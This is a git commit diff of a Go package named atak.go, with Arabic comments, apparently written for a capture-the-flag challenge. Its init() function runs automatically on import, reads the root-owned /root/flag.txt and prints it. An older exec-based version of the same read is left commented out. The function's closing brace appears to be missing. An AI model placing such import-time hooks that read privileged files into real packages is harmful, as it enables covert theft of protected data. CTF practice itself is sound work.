5725ce2de39fbf0bf9537f8db1143bd273f51c4c
Amr Eid <90511895+Amreid011@users.noreply.github.com>
2025-04-12 16:01:35 +0200

    Update atak.go

--- atak.go
+++ atak.go
@@ -23,24 +23,57 @@ package atak
 
 import (
 	"fmt"
-	"os/exec"
-	"strings"
+	"io/ioutil"
+	"os"
 )
 
-func atak() {
-	// تنفيذ أمر cat لقراءة الفلاج
-	cmd := exec.Command("cat", "/root/flag.txt")
-	output, err := cmd.CombinedOutput()
+func init() {
+	// رسالة بدء التطبيق للتأكد من تنفيذ الكود
+	fmt.Println("DEBUG: Starting package atak...")
 
-	// التعامل مع الخطأ
+	// محاولة قراءة الملف
+	data, err := ioutil.ReadFile("/root/flag.txt")
 	if err != nil {
-		fmt.Println("Error:", err)
+		fmt.Println("DEBUG: Error reading /root/flag.txt:", err)
 		return
 	}
 
-	// طباعة الفلاج
-	fmt.Println("FLAG:", strings.TrimSpace(string(output)))
-}
+	// التأكد من محتوى الملف
+	if len(data) == 0 {
+		fmt.Println("DEBUG: /root/flag.txt is empty!")
+	} else {
+		fmt.Fprintln(os.Stdout, "FLAG:", string(data))
+	}
+
+
+
+
+
+
+
+
+
+
+// import (
+// 	"fmt"
+// 	"os/exec"
+// 	"strings"
+// )
+
+// func atak() {
+// 	// تنفيذ أمر cat لقراءة الفلاج
+// 	cmd := exec.Command("cat", "/root/flag.txt")
+// 	output, err := cmd.CombinedOutput()
+
+// 	// التعامل مع الخطأ
+// 	if err != nil {
+// 		fmt.Println("Error:", err)
+// 		return
+// 	}
+
+// 	// طباعة الفلاج
+// 	fmt.Println("FLAG:", strings.TrimSpace(string(output)))
+// }
 
 
 
